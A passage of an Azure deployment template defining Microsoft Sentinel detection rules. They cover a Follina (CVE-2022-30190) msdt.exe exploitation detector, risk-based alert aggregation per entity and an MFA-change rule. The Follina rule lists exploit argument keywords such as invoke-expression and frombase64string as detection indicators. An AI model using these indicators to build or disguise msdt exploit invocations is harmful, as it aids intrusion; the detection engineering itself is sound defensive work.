strcat(desc_gen['long_template'],'\\n\\n',ExtendedDescription)\n    , bv_desc_s =desc_gen['short_template']     \n| extend bv_user1 = bv_user[0]\n      , bv_alarm_victim_entities = pack_array(bv_object)\n      , bv_alarm_attacker_entities = bv_user\n| extend bv_rule_version = '1.2.5371'\n| extend bv_rule_timestamp = '1718982829.4097426'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.2.5371 bv_rule_timestamp: 1718982829.4097426'\n| project-keep bv_*",
          "queryFrequency": "PT1H",
          "queryPeriod": "P2D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-11015: [RBA] Windows - {{bv_desc_s}}",
            "alertDescriptionFormat": "{{bv_desc_l}}\n\ntag: RBA\nCategory:  Windows Security\nMITRE: T1098\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "VictimEntity": "bv_alarm_victim_entities",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_user1"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_object"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-2509')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-2509')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-2509: [SOC] Windows - CVE-2022-30190 Suspicious msdt.exe execution",
          "description": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution.\n\nThis rule will monitor for specific process creation activity associated with the recent CVE-2022-30190 Office/Msdt exploitations. \n\nInclusions: None \nExclusions: None \n\nConsiderations: \n  1. Review associated behavior for the host and user. \n\n  2. Search for the activity in Microsoft Defender for Endpoint to identify arguments associated with the exploits (frombase64string|it_browseforfile|it_rebrowseforfile|invoke-expression)' MITRE: T1203 Category: Windows Security Events tag: SOC",
          "severity": "High",
          "enabled": true,
          "query": "let alert_id = 'BV-2509:';    \nlet start_time = 1h;\nlet start_time_suppress = 1d;      \nlet end_time = now();\nlet latency = 1h;\nlet excluded_description_fields = dynamic(['bv_raw']);\nlet description = (table_parameter: (*), excluded_fields:dynamic=dynamic(['']), max_field_length:int=300, max_array_length:int=5){\n    table_parameter\n    | extend all_data = pack_all()\n    | extend keys = bag_keys(all_data)\n    | mv-apply k = keys to typeof(string) on (\n        extend dynamic_entity = todynamic(trim(' ',tostring(all_data[k])))\n        | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (excluded_fields)), strcat(\n            case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(dynamic_entity)[0]) and array_length(dynamic_entity) > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(dynamic_entity,0,(max_array_length-1)),'\\n* '),0,max_field_length), '\\n')\n            , gettype(dynamic_entity) != 'array' and isnotempty(array_sort_desc(pack_array(tostring(all_data[k])))[0]), strcat(k,': ', dynamic_entity)\n            , gettype(dynamic_entity) == 'array' and array_length(dynamic_entity) == 1, strcat(k,': ', dynamic_entity[0])\n            , '')\n            ),'')\n            | summarize ExtendedDescription = make_set(ExtendedDescription)\n    )\n    | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};      \nSecurityEvent\n| where TimeGenerated between (ago(latency + start_time)..end_time) and ingestion_time() > ago(start_time)\n| where EventID == 4688\n| extend bv_rule_version = '1.1.5310'\n| extend bv_rule_timestamp = '1717013581.9664223'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.1.5310 bv_rule_timestamp: 1717013581.9664223'\n| project TimeGenerated, Computer, Account, NewProcessName, ParentProcessName, CommandLine, ProcessId\n| sort by Computer, TimeGenerated asc\n| scan declare(step:string, success:bool, parent_process:string, command_line:string, user:string) with(\n    step s1: NewProcessName contains 'msdt.exe' and isnotempty(CommandLine) and CommandLine has_any ('frombase64string','it_browseforfile','it_rebrowseforfile', 'invoke-expression', 'PCWDiagnostic', 'it_launchmethod') => step = 's1', parent_process=ParentProcessName, command_line=CommandLine, user=Account;\n    step s2: NewProcessName contains 'sdiagnhost.exe' and TimeGenerated - s1.TimeGenerated <= 1m and Computer == s1.Computer => step = 's2' ;\n    step s3: ParentProcessName contains 'sdiagnhost.exe' and NewProcessName contains 'conhost.exe' and TimeGenerated - s2.TimeGenerated <= 1m and Computer == s1.Computer => step = 's3', success=true;\n    )\n| where success\n| summarize FirstEvent=min(TimeGenerated), LastEvent=max(TimeGenerated), Account=take_any(user), ParentProcess=take_any(parent_process), CommandLine=take_any(command_line),ProcessNames=make_set_if(NewProcessName, isnotempty(step)) by Computer\n| extend bv_dedup_hash = hash_sha1(strcat(Account,Computer))\n| where BV_FUN_DEDUP(alert_id,start_time_suppress) !has bv_dedup_hash        \n| parse Computer with ComputerName '.' ComputerDomain\n| extend ComputerName = iff(isempty(ComputerName), Computer, ComputerName)\n| parse Account with UserDomain @'\\' UserName\n| extend  bv_start_time=FirstEvent\n    , bv_end_time=LastEvent\n    , bv_src_dvc=Computer\n    , bv_src_user = Account\n    , bv_process_command_line =CommandLine\n    , bv_parent_process = ParentProcess\n    , bv_src_dvc_hostname = ComputerName\n    , bv_src_dvc_domain = ComputerDomain\n    , bv_user = UserName\n    , bv_user_domain = UserDomain\n    , bv_process = ProcessNames\n| invoke description(excluded_description_fields, 300, 5)      \n| extend bv_alarm_victim_entities = pack_array(ComputerName, UserName)\n       , bv_mapping_tag = Account\n| extend bv_rule_version = '1.1.5310'\n| extend bv_rule_timestamp = '1717013581.9664223'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.1.5310 bv_rule_timestamp: 1717013581.9664223'\n| project-keep bv_*\n    , ExtendedDescription",
          "queryFrequency": "PT1H",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution"
          ],
          "techniques": [
            "T1203"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Host",
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "This rule will monitor for specific process creation activity associated with the recent Office/Msdt exploitations (CVE-2022-30190)\nConsiderations: \n  1. Review associated behavior for the host and user. \n  2. Search for the activity in Microsoft Defender for Endpoint or Sentinel to identify arguments associated with the exploits (frombase64string|it_browseforfile|it_rebrowseforfile|invoke-expression)'\n\n{{ExtendedDescription}}\n\n\nMITRE: T1203\nCategory: Windows Security\ntag: SOC\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "VictimEntity": "bv_alarm_victim_entities",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_user"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "bv_user_domain"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "bv_src_dvc_hostname"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "bv_src_dvc_domain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-915')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-915')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-915: [RBA] BlueVoyant RBA - Entity Aggregated Behavior Incident - 911 Mirrored",
          "description": "This rule identifies aggregated behaviors by entity that should be further investigated MITRE: T1059 Category: BVIM tag: RBA",
          "severity": "High",
          "enabled": true,
          "query": "let description = (table_parameter: (*), excluded_fields:dynamic=dynamic(['']), max_field_length:int=300, max_array_length:int=5){\n    table_parameter\n    | extend all_data = pack_all()\n    | extend keys = bag_keys(all_data)\n    | mv-apply k = keys to typeof(string) on (\n        extend dynamic_entity = todynamic(trim(' ',tostring(all_data[k])))\n        | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (excluded_fields)), strcat(\n            case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(dynamic_entity)[0]) and array_length(dynamic_entity) > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(dynamic_entity,0,(max_array_length-1)),'\\n* '),0,max_field_length), '\\n')\n            , gettype(dynamic_entity) != 'array' and isnotempty(array_sort_desc(pack_array(tostring(all_data[k])))[0]), strcat(k,': ', dynamic_entity)\n            , gettype(dynamic_entity) == 'array' and array_length(dynamic_entity) == 1, strcat(k,': ', dynamic_entity[0])\n            , '')\n            ),'')\n            | summarize ExtendedDescription = make_set(ExtendedDescription)\n    )\n    | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet desc_gen = (T: (*), ttype:string){\n  T\n  | extend a = pack_all()\n  | extend t = tostring(a[ttype])\n  | extend t = replace('\\n', '@new_line@',t)\n  | extend ot = extract_all(@'(\\[.*?\\])',t)\n  | mv-apply o = ot on (\n      parse o with * '~' k'~' *\n      | extend v = todynamic(a[k])\n      | extend v = iff(gettype(v) !='array', pack_array(v), v)\n      | extend r = iff(isempty(v) or (array_length(v) == 1 and (isempty(v[0]) or v[0] == 0) or array_length(v)==0),'',o)\n      | extend r = trim_end(@'\\]',r)\n      | extend r = trim_start(@'\\[.*~',r)\n      | summarize otr =make_list(r)\n  )\n  | extend tr = replace_strings(t, ot, otr )\n  | extend sdk = extract_all(@'(<bv_[\\w_]*>)',tr)\n  | extend gk = extract_all(@'(<g_bv_[\\w_]*>)',tr)\n  | mv-apply g = gk on (\n      parse g with '<g_' key '_p' *\n      | parse g with * '_p_' verb '>'\n      | extend v = a[key]\n      | extend ip = (gettype(v) == 'array' and array_length(v) > 1) or toint(v)>1\n      | extend r = case (\n          isempty(verb) and not(ip), ''\n          , isempty(verb) and ip, 's'\n          , verb == 'was' and (not(ip) or isempty(ip)), 'was'\n          , verb == 'was' and ip, 'were'\n          , verb == 'this' and ip, 'these'\n          , verb == 'this' and not(ip), 'this'\n          , verb == 'is' and (not(ip) or isempty(ip)), 'is'\n          , verb == 'is' and ip, 'are'\n      ,''\n      )\n      | summarize gr = make_list(r)\n  )\n  | mv-apply k = sdk on (\n      parse k with '<' key '>'\n      | extend v = todynamic(tostring(a[key]))\n      | extend v = iff(gettype(v) != 'array', pack_array(v), v)\n      | extend vl = array_length(v)\n      | extend r = case(\n          vl == 1, v[0]\n          , vl == 2, strcat(v[0], ' and ', v[1])\n          ,vl  > 2, strcat(v[0], ', ', v[1], ', and ', vl-2, ' others')\n          ,'')\n  | summarize r = make_list(r))\n  | extend dr = replace_strings(tr, sdk, r)\n  | extend dr = replace_strings(dr, gk, gr)\n  | extend dr = replace('@new_line@', '\\n',dr)\n  | extend hd = coalesce(a['desc_gen'],dynamic({}))\n  | extend desc_gen = bag_set_key(hd, ttype, dr)\n};\nlet empty_deployed_alerts = datatable(bv_rule_signature:string,bv_rule_id:string,bv_rule_signature_s:string)[];\nlet alert_names = (union isfuzzy=true\n  empty_deployed_alerts\n  ,(\n    SentinelDeployedAlerts_CL\n    | where TimeGenerated > ago(14d)\n    | parse DisplayName_s with bv_rule_id ':' * '-' bv_rule_signature_s\n    | sort by TimeGenerated desc\n    | summarize\n        arg_max(TimeGenerated, DisplayName_s)\n        , alert_name = make_set(bv_rule_signature_s) by bv_rule_id\n    | extend bv_rule_version = '1.9.5327'\n| extend bv_rule_timestamp = '1717602415.4984472'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.9.5327 bv_rule_timestamp: 1717602415.4984472'\n| project\n        bv_rule_signature = DisplayName_s\n        , bv_rule_id\n        , bv_rule_signature_s=tostring(alert_name[0])\n    )\n);\nlet alert_id = 'BV-915';\nlet start_time = 1h;\nlet start_time_historical = 7d;\nlet start_time_suppress = 12h;\nlet global_config = dynamic({\n    'THRESHOLD': 7\n    , 'EXCLUDED_ACCOUNT': dynamic(['root','-','administrator','admin'])\n    , 'EXCLUDED_USER_REGEX': @'EXCLUDED_USER_REGEX'\n    , 'EXCLUDED_SIGNATURE': dynamic(['Phish delivered due to an IP allow policy', 'Phish delivered due to an ETR override', 'Email messages containing', 'Email reported by user as junk','Email messages from a campaign removed after delivery\u00e2\u20ac\u2039','Defender for Endpoints'])\n});\nlet bv_alarm_threshold = coalesce(BV911_CONFIG['THRESHOLD'], global_config['THRESHOLD']);\nlet excluded_description_fields = dynamic(['bv_rule_metrics']);\nlet excluded_user = strcat(global_config['EXCLUDED_USER_REGEX'], \n    iff(isnotempty(BV911_CONFIG.EXCLUDED_USER_REGEX),strcat('| ', BV911_CONFIG.EXCLUDED_USER_REGEX),''));   \nSecurityAlert\n| where TimeGenerated > ago(start_time_historical)\n| extend bv_rule_version = '1.9.5327'\n| extend bv_rule_timestamp = '1717602415.4984472'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.9.5327 bv_rule_timestamp: 1717602415.4984472'\n| project TimeGenerated, AlertName, Description,ExtendedProperties,SystemAlertId\n| parse AlertName with RuleId ': [' Class '] ' Product ' - ' RuleName\n| where isnotempty(RuleId) and RuleId !in~ (BV911_CONFIG_GLOBAL.EXCLUDED_RULES)\nand not(AlertName has_any (global_config['EXCLUDED_SIGNATURE']))\n| extend custom_details =todynamic(tostring(todynamic(ExtendedProperties)['Custom Details']))\n| extend\n    VE = todynamic(tostring(todynamic(tostring(custom_details.VictimEntity))[0]))\n    , AE = todynamic(tostring(todynamic(tostring(custom_details.AttackerEntity))[0]))\n    , RS = todynamic(tostring(todynamic(tostring(custom_details.RBAScore))[0]))\n    , DH = todynamic(tostring(custom_details.bv_dedup_hash))[0]\n    , BI= todynamic(tostring(custom_details.bv_behavior_id))[0]\n| extend\n    AE = iff(gettype(AE) != 'array' and isnotempty(AE), pack_array(AE), AE)\n    , VE = iff(gettype(VE) != 'array' and isnotempty(VE), pack_array(VE), VE)\n| extend E = array_concat(AE, VE)\n| mv-expand E to typeof(string)\n| where\n    isnotempty(E)\n    and isempty(ipv6_compare(E,'127.0.0.1')) and E !in~ (global_config['EXCLUDED_ACCOUNT'])\n        and E matches regex tostring(excluded_user) == false\n| extend\n    bv_entity = tolower(iff(isnotempty(bv_cim_normalize_username(E)), bv_cim_normalize_username(E), E))\n    , DE = extract(@'(.*)\\n',0,Description)\n    , RS = iff(isempty(RS), 1.0, RS)\n    , D = datetime_diff('Day', now(),TimeGenerated)\n    , MATID = tostring(extract_all(@' (T\\d\\d\\d\\d) ',Description)[0])\n| extend DedupHash = case(\n    isnotempty(BI), BI\n    , isnotempty (DH), DH\n    , hash_sha1(strcat(RuleId, MATID))\n)\n| extend DF = pow(2, -(D))\n| extend WScore = RS * DF\n| extend DH = case(\n            isnotempty(BI), BI\n            , isnotempty (DH), DH\n            , hash_sha1(strcat(RuleId, MATID))\n        )\n| summarize\n          bv_start_time=min(TimeGenerated)\n          , bv_end_time=max(TimeGenerated)\n          , bv_duplicate_alert_count=count()\n          , MaxWScore = max(WScore)\n          , MaxRBAScore = max(RS)\n          , bv_connector = make_set(Product)\n          , SystemAlertIds=make_set(SystemAlertId,5)\n          , MT = make_set(MATID)\n          , DS = take_any(DE)\n          , S = take_any(RuleName)\n          , bv_weighted_score = max(WScore)\n      by\n        bv_entity\n        , bv_dedup_hash = DH\n        , bv_rule_id = RuleId\n| join kind=leftouter alert_names on bv_rule_id\n| extend WeightedLength = iff(MaxWScore > 0.0, 1.0, 0.0)\n| extend PercentOfMax = MaxWScore/10\n| sort by bv_entity, MaxWScore asc, WeightedLength asc\n| extend CurrentLength = row_cumsum(WeightedLength, bv_entity != prev(bv_entity))\n| extend Weight = CurrentLength / (CurrentLength + 1.0)\n| scan declare (runningTotal:decimal=decimal(0.0), step:string='') with\n(\n    step previousRow: true => runningTotal = iff(bv_entity == previousRow.bv_entity, (previousRow.runningTotal + (10.0-previousRow.runningTotal) * PercentOfMax * Weight),todecimal(10.0 * PercentOfMax * Weight ));\n)\n| summarize\n        bv_start_time=min(bv_start_time)\n        , bv_end_time=max(bv_end_time)\n        , bv_event_count=sum(bv_duplicate_alert_count)\n        , MT=make_set(MT)\n        , bv_alarm_value=max(runningTotal)\n        , bv_connector = make_set(bv_connector,5)\n        , bv_alert_id=make_set(SystemAlertIds,5)\n        , bv_rule_count = count()\n        , rule_total = sum(bv_duplicate_alert_count)\n        , bv_alert_description_s = take_any(DS)\n        , bv_alert_signature_s = take_any(S)\n        , max_score = max(MaxRBAScore)\n        , bv_weighted_score = max(bv_weighted_score)\n    by\n        bv_entity\n        , bv_rule_id\n        , bv_rule_signature\n        , bv_rule_signature_s\n| extend bv_alarm_threshold = bv_alarm_threshold\n| extend duplicate_count = rule_total - bv_rule_count\n| extend bv_rule_metrics = bag_pack(\n        'rule_id',bv_rule_id\n        ,'total_count',rule_total\n        ,'unique_count',bv_rule_count\n        ,'duplicate_count',duplicate_count\n        ,'max_score',max_score\n        , 'alert_description', bv_alert_description_s\n        , 'alert_signature', bv_alert_signature_s\n        , 'weighted_max', bv_weighted_score\n        , 'alert_ids', bv_alert_id\n        , 'rule_signature', bv_rule_signature_s)\n| sort by bv_weighted_score desc              \n| summarize\n    bv_start_time=min(bv_start_time)\n    , bv_end_time=max(bv_end_time)\n    , bv_event_count=sum(bv_event_count)\n    , bv_mitre_technique_id=make_set(MT)\n    , bv_alarm_value=max(bv_alarm_value)\n    , bv_connector = make_set(bv_connector,20)\n    , bv_alert_id=make_set(bv_alert_id,20)\n    , bv_rule_metrics = make_list(bv_rule_metrics)\n    , bv_rule_metrics_non_zero = countif(bv_rule_metrics.max_score > 0)\nby bv_entity\n| where bv_rule_metrics_non_zero > 2\n| where bv_alarm_value >= toreal(bv_alarm_threshold)       \n| invoke description(excluded_description_fields)\n| extend\n    R0 = bv_rule_metrics[0]\n    , R1 = bv_rule_metrics[1]\n| extend\n        bv_d_rs1 = R0['rule_signature']\n        , bv_d_rs2 = R1['rule_signature']\n        , bv_d_ri1 = R0['rule_id']\n        , bv_d_ri2 = R1['rule_id']\n        , bv_d_am1 = R0['weighted_max']\n        , bv_d_am2 = R1['weighted_max']\n        , bv_d_ac1 = R0['total_count']\n        , bv_d_ac2 = R1['total_count']\n        , bv_d_sc = array_length(bv_rule_metrics)\n        , bv_d_ad1 = R0['alert_description']\n        , bv_d_ad2 = R1['alert_description']\n        , bv_d_as1 = R0['alert_signature']\n        , bv_d_as2 = R1['alert_signature']\n        , bv_alarm_value = round(bv_alarm_value,2)\n| mv-apply m = bv_rule_metrics on (\n    extend s = strcat('* ', m.rule_id,' ',trim('\\n',tostring(m.rule_signature)),' (count: ',m.total_count, ')\\n')\n    | summarize s = make_set(s), bv_alert_id=make_set(m.alert_ids), bv_rule_ids = make_set(m.rule_id)\n)\n| extend\n    bv_d_s = strcat_array(s,'')\n    , bv_d_tc = iff(bv_d_sc < 3, int(null), bv_d_sc - 2)\n    , bv_alarm_value = round(bv_alarm_value,2)\n    , alert_id_temp = alert_id\n    , bv_rule_ids = array_sort_asc(bv_rule_ids)\n| extend bv_agg_behavior_hash = hash_sha1(tostring(bv_rule_ids))\n| lookup bv_desc_temp on alert_id_temp\n| invoke desc_gen('long_template')\n| invoke desc_gen('short_template')\n| extend\n          bv_desc_l = desc_gen['long_template']\n          , bv_desc_s =desc_gen['short_template']\n          , MitreString = strcat('MITRE: ', strcat_array(bv_mitre_technique_id, '\\nMITRE: '))\n          , bv_dedup_hash = hash_sha1(bv_entity)\n          , bv_mapping_tag = bv_entity\n| extend bv_encoded_cd = gzip_compress_to_base64_string(tostring(bag_pack('RuleMetrics', bv_rule_metrics, 'RuleId', bv_rule_ids, 'SystemAlertIds', bv_alert_id)))                 \n| where BV_FUN_DEDUP(alert_id, start_time_suppress) !has bv_dedup_hash\n| extend bv_rule_version = '1.9.5327'\n| extend bv_rule_timestamp = '1717602415.4984472'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.9.5327 bv_rule_timestamp: 1717602415.4984472'\n| project-away bv_d_*\n| extend bv_rule_version = '1.9.5327'\n| extend bv_rule_timestamp = '1717602415.4984472'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.9.5327 bv_rule_timestamp: 1717602415.4984472'\n| project-keep\n    bv_*",
          "queryFrequency": "PT1H",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl",
            "Execution"
          ],
          "techniques": [
            "T1059"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-915: [RBA] {{bv_desc_s}}",
            "alertDescriptionFormat": "{{bv_desc_l}}\n\nCategory: Security Alert Correlation  \ntag: RBA\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "Score": "bv_alarm_value",
            "Entity": "bv_entity",
            "bv_encoded_cd": "bv_encoded_cd",
            "bv_agg_behavior_hash": "bv_agg_behavior_hash",
            "Mitre": "bv_mitre_technique_id",
            "Connectors": "bv_connector",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_entity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-1905')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-1905')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-1905: [Custom] AzureAD - MFA Changes",
          "description": "This alert identifies MFA changes. MITRE: T1078 Category: Entra ID tag: Custom",
          "severity": "Low",
          "enabled": false,
          "query": "let latency = 1h;\nlet start_time =1h;\nlet end_time = now();\nlet alert_bin = 1h;\nlet start_time_historical=2d; \nlet UserMFA = dynamic([\n    'Remove users strong authentication phone app detail'\n    , 'User changed default security info'\n    , 'User deleted security info'\n    , 'Admin deleted security info'\n    , 'StrongAuthenticationMethod'\n    , 'StrongAuthenticationUserDetails'\n    , 'User registered security info'\n    , 'User registered Mobile Phone SMS'\n    //, 'Update user'\n    //, 'StrongAuthenticationPhoneAppDetail'\n    ]);\nlet user_names =     \n    union isfuzzy=true \n        (\n        SigninLogs\n        | where TimeGenerated > ago(start_time_historical)\n        | where UserPrincipalName contains '@'\n        // | where user_ids contains UserId\n        | summarize\n            by\n            bv_src_user_id = UserId,\n            bv_src_user = tolower(UserPrincipalName),\n            bv_src_user_identity = Identity\n        ),\n        (\n        AADNonInteractiveUserSignInLogs\n        | where TimeGenerated > ago(start_time_historical)\n        | where UserPrincipalName contains '@'\n        //| where user_ids contains UserId\n        | summarize\n            by\n            bv_src_user_id = UserId,\n            bv_src_user = tolower(UserPrincipalName),\n            bv_src_user_identity = Identity\n        ),\n        (IdentityInfo\n        | where TimeGenerated > ago(start_time_historical)\n        | project AccountObjectId, AccountUPN, AccountName, AccountDisplayName, GroupMembership\n        | summarize\n            by\n            bv_src_user_id = AccountObjectId,\n            bv_src_user = tolower(AccountUPN),\n            bv_src_username = tolower(AccountName),\n            bv_src_user_identity = tolower(AccountDisplayName),\n            bv_src_group = tostring(GroupMembership))\n    | extend bv_src_username = column_ifexists('bv_src_username', '')\n    | summarize \n        bv_src_username=make_set_if(bv_src_username, isnotempty(bv_src_username)) \n        by \n        bv_src_user_id\n        , bv_src_user=tolower(bv_src_user)\n        , bv_src_user_identity=tolower(bv_src_user_identity)\n    | where isnotempty(bv_src_user_id)\n;\nAuditLogs\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() >= ago(start_time)\n| where OperationName in (UserMFA) \n    or TargetResources contains 'StrongAuthenticationUserDetails'\n    or (TargetResources contains 'StrongAuthenticationPhoneAppDetail')\n| extend SrcUsername = tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)\n| extend SrcIpAddress = tostring(parse_json(tostring(InitiatedBy.user)).ipAddress)\n| extend Object = tostring(TargetResources[0].userPrincipalName)\n| extend ObjAttr = TargetResources[0].modifiedProperties\n| mv-apply a = ObjAttr on ( \n    extend NewValues = iff(a.displayName == 'StrongAuthenticationUserDetails', a.newValue, '')\n    | extend OldValues = iff(a.displayName == 'StrongAuthenticationUserDetails', a.oldValue, '')\n    | extend OldPhoneNumber = iff(a.displayName == 'Phone.PhoneNumber', a.oldValue, '')\n    | extend NewPhoneNumber = iff(a.displayName == 'Phone.PhoneNumber', a.newValue, '')\n    | extend OldApp = iff(a.displayName == 'StrongAuthenticationPhoneAppDetail', a.oldValue, '')\n    | extend NewApp = iff(a.displayName == 'StrongAuthenticationPhoneAppDetail', a.newValue, '')\n    | summarize\n        take_any(OldPhoneNumber),\n        take_any(NewPhoneNumber),\n        take_any(NewValues),\n        take_any(OldValues),\n        take_any(OldApp),\n        take_any(NewApp)\n    )\n| extend NewValues = iff(array_length(todynamic(NewValues)) > 0, NewValues, pack_array(''))\n| extend OldValues = iff(array_length(todynamic(OldValues)) > 0, OldValues, pack_array(''))\n| mv-apply a = todynamic(OldApp) on ( \n    extend OldAppName = a.DeviceName\n    | summarize OldAppName=make_set_if(OldAppName, isnotempty(OldAppName))\n)\n| mv-apply a = todynamic(NewApp) on ( \n    extend NewAppName = a.DeviceName\n    | summarize NewAppName=make_set_if(NewAppName, isnotempty(NewAppName))\n)\n| where array_length(set_difference(NewAppName,OldAppName)) > 0 or (array_length(OldAppName) == 0 and array_length(NewAppName) == 0)\n| mv-apply v=todynamic(NewValues) on ( \n    extend NewValueString = strcat(\n        iff(isnotempty(v.PhoneNumber), strcat('* Phone Number: ', v.PhoneNumber, '\\n'), '')\n        , iff(isnotempty(v.AlternativePhoneNumber), strcat('* Alternate Number: ', v.AlternativePhoneNumber, '\\n'), '')\n        , iff(isnotempty(v.Email), strcat('\\n* Email: ', v.Email, '\\n'), '')\n        , iff(isnotempty(v.VoiceOnlyPhoneNumber), strcat('\\n* Voice Only Phone:  ', v.VoiceOnlyPhoneNumber, '\\n'), '')\n        )\n    ) \n| mv-apply v=todynamic(OldValues) on ( \n    extend OldValueString = strcat(\n        iff(isnotempty(v.PhoneNumber), strcat('* Phone Number: ', v.PhoneNumber, '\\n'), '')\n        , iff(isnotempty(v.AlternativePhoneNumber), strcat('* Alternate Number: ', v.AlternativePhoneNumber, '\\n'), '')\n        , iff(isnotempty(v.Email), strcat('\\n* Email: ', v.Email, '\\n'), '')\n        , iff(isnotempty(v.VoiceOnlyPhoneNumber), strcat('\\n* Voice Only Phone:  ', v.VoiceOnlyPhoneNumber, '\\n'), '')\n        )\n    ) \n| extend ExtendedDescription = strcat(\n    'SrcUsername: ', SrcUsername\n    , '\\nSrcIpAddress: ', SrcIpAddress\n    , '\\nObject: ', Object\n    , '\\nOperation Name: ', OperationName\n    , '\\nResult: ', ResultDescription\n    , iff( \n    ResultDescription !in (\n    'User deleted Authenticator App with Notification and Code'\n    , 'User changed default security info to Authenticator App with Notification and Code'\n    , 'User changed default security info to Mobile Phone SMS'\n    , 'User changed default security info to Authenticator App with Code'\n    , 'Remove users strong authentication phone app detail'\n    , 'Admin deleted Microsoft Authenticator Authentication Method for user'\n    ), \n    strcat(\n    iff(isnotempty(OldValueString), strcat('\\nOldValues: ', OldValueString), '')\n    , iff(isnotempty(NewValueString), strcat('\\nNewValues: ', NewValueString), 